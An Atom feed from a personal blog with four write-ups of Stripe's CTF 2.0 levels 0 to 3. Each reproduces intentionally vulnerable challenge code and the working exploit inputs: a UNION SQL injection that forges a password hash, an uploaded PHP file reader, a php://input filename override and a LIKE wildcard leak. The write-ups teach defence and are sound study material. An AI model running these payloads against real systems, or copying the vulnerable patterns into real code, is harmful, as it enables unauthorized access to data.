<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: ctf | Qiu's Quibble]]></title>
  <link href="http://kevinjqiu.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://kevinjqiu.github.io/"/>
  <updated>2015-09-04T00:02:53-04:00</updated>
  <id>http://kevinjqiu.github.io/</id>
  <author>
    <name><![CDATA[Kevin Jing Qiu]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Stripe Capture The Flag 2.0 - Problem 3]]></title>
    <link href="http://kevinjqiu.github.io/2012/09/19/ctf2-dot-0-problem-3/"/>
    <updated>2012-09-19T00:01:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2012/09/19/ctf2-dot-0-problem-3</id>
    <content type="html"><![CDATA[<h2>Level 3</h2>

<p>Finally we get to level 3. Here&rsquo;s the setup:</p>

<pre><code>After the fiasco back in Level 0, management has decided to fortify the Secret Safe into an unbreakable solution (kind of like Unbreakable Linux). The resulting product is Secret Vault, which is so secure that it requires human intervention to add new secrets.

A beta version has launched with some interesting secrets (including the password to access Level 4)
</code></pre>

<p>Here&rsquo;s the code for the server (Python finally!)
<div><script src='https://gist.github.com/3747632.js'></script>
<noscript><pre><code>#!/usr/bin/env python
#
# Welcome to the Secret Safe!
#
# - users/users.db stores authentication info with the schema:
#
# CREATE TABLE users (
#   id VARCHAR(255) PRIMARY KEY AUTOINCREMENT,
#   username VARCHAR(255),
#   password_hash VARCHAR(255),
#   salt VARCHAR(255)
# );
#
# - For extra security, the dictionary of secrets lives
#   data/secrets.json (so a compromise of the database won&#39;t
#   compromise the secrets themselves)

import flask
import hashlib
import json
import logging
import os
import sqlite3
import subprocess
import sys
from werkzeug import debug

# Generate test data when running locally
data_dir = os.path.join(os.path.dirname(__file__), &#39;data&#39;)
if not os.path.exists(data_dir):
    import generate_data
    os.mkdir(data_dir)
    generate_data.main(data_dir, &#39;dummy-password&#39;, &#39;dummy-proof&#39;, &#39;dummy-plans&#39;)

secrets = json.load(open(os.path.join(data_dir, &#39;secrets.json&#39;)))
index_html = open(&#39;index.html&#39;).read()
app = flask.Flask(__name__)

# Turn on backtraces, but turn off code execution (that&#39;d be an easy level!)
app.config[&#39;PROPAGATE_EXCEPTIONS&#39;] = True
app.wsgi_app = debug.DebuggedApplication(app.wsgi_app, evalex=False)

app.logger.addHandler(logging.StreamHandler(sys.stderr))
# use persistent entropy file for secret_key
app.secret_key = open(os.path.join(data_dir, &#39;entropy.dat&#39;)).read()

# Allow setting url_root if needed
try:
    from local_settings import url_root
except ImportError:
    pass

def absolute_url(path):
    return url_root + path

@app.route(&#39;/&#39;)
def index():
    try:
        user_id = flask.session[&#39;user_id&#39;]
    except KeyError:
        return index_html
    else:
        secret = secrets[str(user_id)]
        return (u&#39;Welcome back! Your secret is: &quot;{0}&quot;&#39;.format(secret) +
                u&#39; (&lt;a href=&quot;./logout&quot;&gt;Log out&lt;/a&gt;)\n&#39;)

@app.route(&#39;/logout&#39;)
def logout():
    flask.session.pop(&#39;user_id&#39;, None)
    return flask.redirect(absolute_url(&#39;/&#39;))

@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
def login():
    username = flask.request.form.get(&#39;username&#39;)
    password = flask.request.form.get(&#39;password&#39;)

    if not username:
        return &quot;Must provide username\n&quot;

    if not password:
        return &quot;Must provide password\n&quot;

    conn = sqlite3.connect(os.path.join(data_dir, &#39;users.db&#39;))
    cursor = conn.cursor()

    query = &quot;&quot;&quot;SELECT id, password_hash, salt FROM users
               WHERE username = &#39;{0}&#39; LIMIT 1&quot;&quot;&quot;.format(username)
    cursor.execute(query)

    res = cursor.fetchone()
    if not res:
        return &quot;There&#39;s no such user {0}!\n&quot;.format(username)
    user_id, password_hash, salt = res

    calculated_hash = hashlib.sha256(password + salt)
    if calculated_hash.hexdigest() != password_hash:
        return &quot;That&#39;s not the password for {0}!\n&quot;.format(username)

    flask.session[&#39;user_id&#39;] = user_id
    return flask.redirect(absolute_url(&#39;/&#39;))

if __name__ == &#39;__main__&#39;:
    # In development: app.run(debug=True)
    app.run()
</code></pre></noscript></div>
</p>

<p>&hellip;and here&rsquo;s the front-end:
<div><script src='https://gist.github.com/3747637.js'></script>
<noscript><pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;p&gt;
      Welcome to the Secret Safe, a place to guard your most
      precious secrets! To retreive your secrets, log in below.
    &lt;/p&gt;

    &lt;p&gt;The current users of the system store the following secrets:&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;bob: Stores the password to access level 04&lt;/li&gt;
      &lt;li&gt;eve: Stores the proof that P = NP &lt;/li&gt;
      &lt;li&gt;mallory: Stores the plans to a perpetual motion machine &lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;
      You should use it too!
      &lt;a href=&quot;http://www.youtube.com/watch?v=oHg5SJYRHA0&quot;&gt;Contact us&lt;/a&gt;
      to request a beta invite.
    &lt;/p&gt;

    &lt;form method=&quot;POST&quot; action=&quot;./login&quot;&gt;
      &lt;p&gt;
        &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;
        &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot;&gt;
      &lt;/p&gt;
      &lt;p&gt;
        &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
        &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot;&gt;
      &lt;/p&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Recover your secrets now!&quot;&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre></noscript></div>
</p>

<p>From the description, we know that we need to break into bob&rsquo;s account to retrieve the password to level 4, although breaking into eve and mallory&rsquo;s accounts are attempting :) Afterall, who wouldn&rsquo;t want to know the proof of <a href="http://en.wikipedia.org/wiki/P_versus_NP_problem">P=NP</a> or how to make a <a href="http://en.wikipedia.org/wiki/Perpetual_motion_machine">perpetual motion machine</a>?</p>

<p>Anyhow, the front-end is a typical login page: you get username and password input fields, and they&rsquo;re sent off (via POST) to a server script.
The server is a simple Flask app that gets the user input, checks them against a table of username and salted password hashes.</p>

<p>The <code>login()</code> function is where all the action takes place. Line 86 quickly caught my eyes:</p>

<pre><code class="python">query = """SELECT id, password_hash, salt FROM users WHERE username = '{0}' LIMIT 1""".format(username)
cursor.execute(query)
</code></pre>

<p>This is an alarming pattern of formatting a string and sending it off to <code>cursor.execute()</code>. Python&rsquo;s string <code>format()</code> method is just another way of interopolation. It&rsquo;s exactly the same as <code>"""SELECT id, password_hash, salt FROM user WHERE username = %s""" % username"""</code>.</p>

<p>Now that we found the vulnerability, we need to find a way exploit it.</p>

<h3>Take 1</h3>

<p>Normally, with SQL injection, you craft an input to terminate the previous statement, and inject the statement you want it to execute. Reading the code, it&rsquo;s getting the user&rsquo;s password hash and salt for the given user, and check it against the input hash and salt. The hashing method is <a href="http://en.wikipedia.org/wiki/SHA-2">sha256</a>. With Python, we can quickly pre-calculate a salted hash to inject. Here&rsquo;s an example, with password <code>1</code> and salt <code>a</code>.</p>

<pre><code class="bash">python -c "import hashlib; print hashlib.sha256('1'+'a').hexdigest()"
</code></pre>

<p>and we get <code>a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65</code>.</p>

<p>The statement we really want it to execute is:</p>

<pre><code class="sql">SELECT id, 'a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65', 'a' FROM users WHERE username = 'bob'
</code></pre>

<p>so when we put &lsquo;1&rsquo; in the password input box, we will get the server to run sha246 on &lsquo;1&rsquo; + &lsquo;a&rsquo;, and check it against the hash that we fed in. The entire query gets executed wil look like this (with the middle line being the <code>username</code> we feed in):</p>

<pre><code class="sql">SELECT id, password_hash, salt FROM users WHERE username = '
'; SELECT id,  'a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65', 'a' FROM users WHERE username='bob
' LIMIT 1
</code></pre>

<p>How does that faire?</p>

<p>Unfortunately, we get a stack trace in the traceback:</p>

<pre><code>Traceback (most recent call last):
  File "/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py", line 1689, in wsgi_app
    response = self.make_response(self.handle_exception(e))
  File "/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py", line 1687, in wsgi_app
    response = self.full_dispatch_request()
  File "/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py", line 1360, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py", line 1358, in full_dispatch_request
    rv = self.dispatch_request()
  File "/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py", line 1344, in dispatch_request
    return self.view_functions[rule.endpoint](**req.view_args)
  File "/Users/kevin/src/ctf/level03-code/secretvault.py", line 91, in login
    cursor.execute(query)Warning: You can only execute one statement at a time.
</code></pre>

<p><code>cursor</code> cannot run more than one statement at a time! Smart, eh?</p>

<h3>Take 2</h3>

<p>So the trick here is to use exactly 1 statement to inject our crafted data. We still want this to be returning the same fields. What if I <code>UNION</code> two queries, with the second query selecting the injected data?</p>

<p>So something like this (the middle line is the one we inject as <code>username</code>):</p>

<pre><code class="sql">SELECT id, password_hash, salt FROM users WHERE username = '
bob' UNION select id, 'a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65', 'a' FROM users WHERE username = 'bob
' LIMIT 1
</code></pre>

<p>Submit, and boom:</p>

<pre><code>Welcome back! Your secret is: "..." (Log out)
</code></pre>

<h2>Conclusion</h2>

<p>This is a canonical SQL injection. Again, NEVER trust user input. Always sanitize user input.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Stripe Capture The Flag 2.0 - Problem 2]]></title>
    <link href="http://kevinjqiu.github.io/2012/09/12/ctf2-dot-0-problem-2/"/>
    <updated>2012-09-12T23:50:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2012/09/12/ctf2-dot-0-problem-2</id>
    <content type="html"><![CDATA[<h2>Level 2</h2>

<p><div><script src='https://gist.github.com/3711719.js?file=index.php'></script>
<noscript><pre><code>&lt;?php
  session_start();

  if ($_FILES[&quot;dispic&quot;][&quot;error&quot;] &gt; 0) {
    echo &quot;&lt;p&gt;Error: &quot; . $_FILES[&quot;dispic&quot;][&quot;error&quot;] . &quot;&lt;/p&gt;&quot;;
  }
  else
  {
    $dest_dir = &quot;uploads/&quot;;
    $dest = $dest_dir . basename($_FILES[&quot;dispic&quot;][&quot;name&quot;]);
    $src = $_FILES[&quot;dispic&quot;][&quot;tmp_name&quot;];
    if (move_uploaded_file($src, $dest)) {
      $_SESSION[&quot;dispic_url&quot;] = $dest;
      chmod($dest, 0644);
      echo &quot;&lt;p&gt;Successfully uploaded your display picture.&lt;/p&gt;&quot;;
    }
  }

  $url = &quot;https://upload.wikimedia.org/wikipedia/commons/f/f8/&quot; .
         &quot;Question_mark_alternate.svg&quot;;
  if (isset($_SESSION[&quot;dispic_url&quot;])) {
    $url = $_SESSION[&quot;dispic_url&quot;];
  }

?&gt;

&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Welcome to the CTF!&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;center&gt;
      &lt;h1&gt;Welcome to the CTF Social Network!&lt;/h1&gt;
      &lt;div&gt;
        &lt;img src=&lt;?php echo $url; ?&gt; /&gt;
        &lt;?php
          if (!isset($_SESSION[&quot;dispic_url&quot;])) {
            echo &quot;&lt;p&gt;Oh, looks like you don&#39;t have a profile image&quot; .
                 &quot; -- upload one now!&lt;/p&gt;&quot;;
          }
        ?&gt;
        &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
          &lt;input type=&quot;file&quot; name=&quot;dispic&quot; size=&quot;40&quot; /&gt;
          &lt;input type=&quot;submit&quot; value=&quot;Upload!&quot;&gt;
        &lt;/form&gt;

        &lt;p&gt;
           Password for Level 3 (accessible only to members of the club):
           &lt;a href=&quot;password.txt&quot;&gt;password.txt&lt;/a&gt;
        &lt;/p&gt;
      &lt;/div&gt;
    &lt;/center&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre></noscript></div>
</p>

<p>In level 2, we&rsquo;re faced with a PHP app that allows you to upload a &ldquo;profile picture&rdquo;. The password to level 3 is contained in a &ldquo;password.txt&rdquo; file of the document root, as revealed in line 49. Of course, you won&rsquo;t be able to click on the link and get the file. The directory is protected, and we have to somehow exploit the code.</p>

<p>Reading through the code, it&rsquo;s a clear that whatever file uploaded to the server will be under <code>uploads/</code>, and the file is publicly accessible through <code>&lt;base&gt;/uploads/&lt;your_file_name&gt;</code>, as seen on line 37. The file input is expecting a image file, but it doesn&rsquo;t restrict the type of file it accepts. What if we upload a PHP script, read the file content <code>../password.txt</code>?</p>

<p>With that in mind, I quickly cooked up a PHP script:</p>

<pre><code class="php">&lt;?php
echo file_get_contents('../password.txt');
?&gt;
</code></pre>

<p>uploaded it and hit it with curl. Guess what? The password is right there in the clear!</p>

<h2>Conclusion</h2>

<p>There&rsquo;s a few problems with this app:</p>

<ul>
<li>The user shouldn&rsquo;t be able to upload files of any type they want. Restrict to only image files if you&rsquo;re expecting profile pictures.</li>
<li>The above point is necessary but not sufficient. The bigger problem is that the server is not properly configured. Files under <code>uploads/</code> folder should be considered &ldquo;user input&rdquo; and thus should not be able to be executed on the server. Much more exploits can be done here and as it turns out, some later levels require the control of this machine.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Stripe Capture The Flag 2.0 - Problem 1]]></title>
    <link href="http://kevinjqiu.github.io/2012/09/10/ctf2-dot-0-problem-1/"/>
    <updated>2012-09-10T14:14:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2012/09/10/ctf2-dot-0-problem-1</id>
    <content type="html"><![CDATA[<h2>Level 1</h2>

<p>Now we get to level 1. We are presented with a simple web form with the PHP code powering it.</p>

<p><div><script src='https://gist.github.com/3692642.js?file=index.php'></script>
<noscript><pre><code>&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Guessing Game&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Welcome to the Guessing Game!&lt;/h1&gt;
    &lt;p&gt;
      Guess the secret combination below, and if you get it right,
      you&#39;ll get the password to the next level!
    &lt;/p&gt;
    &lt;?php
      $filename = &#39;secret-combination.txt&#39;;
      extract($_GET);
      if (isset($attempt)) {
        $combination = trim(file_get_contents($filename));
        if ($attempt === $combination) {
          echo &quot;&lt;p&gt;How did you know the secret combination was&quot; .
               &quot; $combination!?&lt;/p&gt;&quot;;
          $next = file_get_contents(&#39;level02-password.txt&#39;);
          echo &quot;&lt;p&gt;You&#39;ve earned the password to the access Level 2:&quot; .
               &quot; $next&lt;/p&gt;&quot;;
        } else {
          echo &quot;&lt;p&gt;Incorrect! The secret combination is not $attempt&lt;/p&gt;&quot;;
        }
      }
    ?&gt;
    &lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
      &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;attempt&quot;&gt;&lt;/p&gt;
      &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Guess!&quot;&gt;&lt;/p&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre></noscript></div>
</p>

<p>The PHP script checks if the input combination matches the combination in &lsquo;secret-combination.txt&rsquo; file, and present the user with the password to the next level if the combinations match.  Obviously, we&rsquo;re not going to guess the combination.</p>

<p>There are a few &lsquo;handy&rsquo; methods in PHP that are extremely dangerous. <a href="http://php.net/manual/en/function.extract.php"><code>extract</code></a> is one of them. It will extract the content of the passed-in associative array, and import them into the global scope. e.g., <code>extract(array('foo'=&gt;'bar'));</code> will make a global variable <code>$foo</code>. What&rsquo;s more dangerous is that if you already have a variable named <code>$foo</code>, it will be overwritten with the new value in the associative array.</p>

<p>Because the secret combination&rsquo;s location is stored in <code>$filename</code> variable, we need to somehow manipulate the input to point <code>$filename</code> to something else.  Looking at line 27:</p>

<pre><code class="html">&lt;form action="#" method="GET"&gt;
&lt;/form&gt;
</code></pre>

<p>So the form is submitted using GET! So manipulating the variable is as easy as sending the endpoint with query param <code>filename=&lt;xyz&gt;</code>.</p>

<p>Now, what will the <code>xyz</code> be? The <code>$filename</code> variable is passed into <code>file_get_contents()</code> function. The parameter to the function is simply a string, and PHP defined a few &lsquo;handy&rsquo; <a href="http://php.net/manual/en/wrappers.php.php">streams</a>. <code>php://input</code> caught my eyes. The doc says <code>php://input is a read-only stream that allows you to read raw data from the request body.</code>. Hey, the form is submitted using GET, so there won&rsquo;t be a request body. The input parameter is also sent using GET variable <code>attempt</code>, so I just need to send an empty <code>attempt</code> and point the filename to <code>php://input</code>: <code>?attempt=&amp;filename=php://input</code></p>

<p>&hellip;And indeed it works!</p>

<h1>Conclusion</h1>

<ul>
<li>Never, ever use <code>extract()</code> in serious applications. Historically, PHP is used to build simple websites so it included many functions that puts &ldquo;convenience&rdquo; over security. Global variables are a bad idea, and having the ability to pollute the global space from any input is way worse.</li>
<li><code>file_get_contents()</code> has the ability to take any string as parameter, including some named streams. They are handy but they pose potential threats.</li>
<li>Again, don&rsquo;t trust user input!</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Stripe Capture The Flag 2.0 - Problem 0]]></title>
    <link href="http://kevinjqiu.github.io/2012/09/09/ctf2-dot-0-problem-0/"/>
    <updated>2012-09-09T23:11:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2012/09/09/ctf2-dot-0-problem-0</id>
    <content type="html"><![CDATA[<p><a href="https://stripe.com">Stripe</a> just finished running a second <a href="https://stripe-ctf.com">&ldquo;capture the flag&rdquo;</a> challenge. They ran a similar challenge this February and was more focused on system level. This time, it&rsquo;s full-on web security.</p>

<p>In the next few posts, I&rsquo;m going to discuss the problems in the challenge, how I solved them and what did I learn from from each challenge.</p>

<h2>Problem 0</h2>

<p>Here are the code for level 0:</p>

<p><div><script src='https://gist.github.com/3688655.js?file=level00.js'></script>
<noscript><pre><code>// Install dependencies with &#39;npm install&#39;
// Run as &#39;node level00.js&#39;

var express = require(&#39;express&#39;), // Web framework
    mu = require(&#39;mu2&#39;),          // Mustache.js templating
    sqlite3 = require(&#39;sqlite3&#39;); // SQLite (database) driver

// Look for templates in the current directory
mu.root = __dirname;

// Set up the DB
var db = new sqlite3.Database(&#39;level00.db&#39;);
db.run(
  &#39;CREATE TABLE IF NOT EXISTS secrets (&#39; +
    &#39;key varchar(255),&#39; +
    &#39;secret varchar(255)&#39; +
  &#39;)&#39;
);

// Create the server
var app = express();
app.use(express.bodyParser());

function renderPage(res, variables) {
  var stream = mu.compileAndRender(&#39;level00.html&#39;, variables);
  res.header(&#39;Content-Type&#39;, &#39;text/html&#39;);
  stream.pipe(res);
}

app.get(&#39;/*&#39;, function(req, res) {
  var namespace = req.param(&#39;namespace&#39;);

  if (namespace) {
    var query = &#39;SELECT * FROM secrets WHERE key LIKE ? || &quot;.%&quot;&#39;;
    db.all(query, namespace, function(err, secrets) {
             if (err) throw err;

             renderPage(res, {namespace: namespace, secrets: secrets});
           });
  } else {
    renderPage(res, {});
  }
});

app.post(&#39;/*&#39;, function(req, res) {
  var namespace = req.body[&#39;namespace&#39;];
  var secret_name = req.body[&#39;secret_name&#39;];
  var secret_value = req.body[&#39;secret_value&#39;];

  var query = &#39;INSERT INTO secrets (key, secret) VALUES (? || &quot;.&quot; || ?, ?)&#39;;
  db.run(query, namespace, secret_name, secret_value, function(err) {
     if (err) throw err;

           res.header(&#39;Content-Type&#39;, &#39;text/html&#39;);
           res.redirect(req.path + &#39;?namespace=&#39; + namespace);
         });
});

if (process.argv.length &gt; 2) {
  var socket = process.argv[2];
  console.log(&quot;Starting server on UNIX socket &quot; + socket);
  app.listen(socket);
} else {
  console.log(&quot;Starting server at http://localhost:3000/&quot;);
  app.listen(3000);
}</code></pre></noscript></div>

<div><script src='https://gist.github.com/3688659.js?file=level00.html'></script>
<noscript><pre><code>&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Secret Safe&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    {{#namespace}}
    &lt;div style=&quot;border-width: 2px; border-style: outset; padding: 5px&quot;&gt;
      Showing secrets for &lt;strong&gt;{{namespace}}&lt;/strong&gt;:
      &lt;table&gt;
        &lt;thead&gt;
          &lt;tr&gt;
            &lt;th&gt;Key&lt;/th&gt;
            &lt;th&gt;Value&lt;/th&gt;
          &lt;/tr&gt;
        &lt;/thead&gt;
        &lt;tbody&gt;
          {{#secrets}}
          &lt;tr&gt;
            &lt;td&gt;{{ key }}&lt;/td&gt;
            &lt;td&gt;{{ secret }}&lt;/td&gt;
          &lt;/tr&gt;
          {{/secrets}}
          {{^secrets}}
          &lt;tr&gt;
            &lt;td span=&quot;2&quot;&gt;
              You have no secrets stored with us. Try using the form below.
            &lt;/td&gt;
          &lt;/tr&gt;
          {{/secrets}}
        &lt;/tbody&gt;
      &lt;/table&gt;

      &lt;hr /&gt;
    &lt;/div&gt;
    {{/namespace}}

    &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;
      &lt;p&gt;
        &lt;label for=&quot;namespace&quot;&gt;Namespace:&lt;/label&gt;
        &lt;input type=&quot;text&quot; name=&quot;namespace&quot; id=&quot;namespace&quot;
            value=&quot;{{ namespace }}&quot; /&gt;
      &lt;/p&gt;
      &lt;p&gt;
        &lt;label for=&quot;secret_name&quot;&gt;Name of your secret:&lt;/label&gt;
        &lt;input type=&quot;text&quot; name=&quot;secret_name&quot; id=&quot;secret_name&quot;&gt;
      &lt;/p&gt;
      &lt;p&gt;
        &lt;label for=&quot;secret_value&quot;&gt;Your secret:&lt;/label&gt;
        &lt;input type=&quot;password&quot; name=&quot;secret_value&quot; id=&quot;secret_value&quot;&gt;
      &lt;/p&gt;
      &lt;p&gt;
        &lt;input type=&quot;submit&quot; value=&quot;Store my secret!&quot; /&gt;
      &lt;/p&gt;
    &lt;/form&gt;
    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
      &lt;label for=&quot;change_namespace&quot;&gt;
        Want to retrieve your secrets? View secrets for:
      &lt;/label&gt;
      &lt;input name=&quot;namespace&quot; id=&quot;change_namespace&quot; /&gt;
      &lt;input type=&quot;submit&quot; value=&quot;View&quot; /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre></noscript></div>
</p>

<p>So you have a node.js server script, with an HTML front-end. The front-end allows you to submit a web form which allows you to retrieve <em>your</em> stored secret but the secret to level 1 is also stored in the same database.</p>

<p>Reading the code, the query on line 34 jumps out at you:</p>

<pre><code class="javascript">    var query = 'SELECT * FROM secrets WHERE key LIKE ? || ".%"';
</code></pre>

<p>Even though I&rsquo;m not too familiar with <a href="http://nodejs.org">nodejs</a> or its db API, the part where it concatenates user input with &ldquo;.%&rdquo; looks suspicious. <code>||</code> is the SQL operator for concatenation, and &lsquo;%&rsquo; is the SQL wildcard that matches 0 or more characters of any kind. What if my user input is &ldquo;%&rdquo;?</p>

<p>Voilà! That&rsquo;s it! <code>%.%</code> gives you all passwords with namespace that has a dot in the middle.</p>

<h2>Conclusion</h2>

<p><a href="http://xkcd.com/327/">SQL-injection</a> is a known security issue for a long time yet you&rsquo;d be surprised how many sites are still subject to such exploits. The problem with level 0 code is exactly that: unsanitized user input is sent directly to the database for execution. So everytime a string concatenation is seen in a SQL statement, you have to ask yourself: is the ting being concatenated trustworthy? Use prepared statement or your database&rsquo;s escape function wherever possible.</p>
]]></content>
  </entry>
  
</feed>
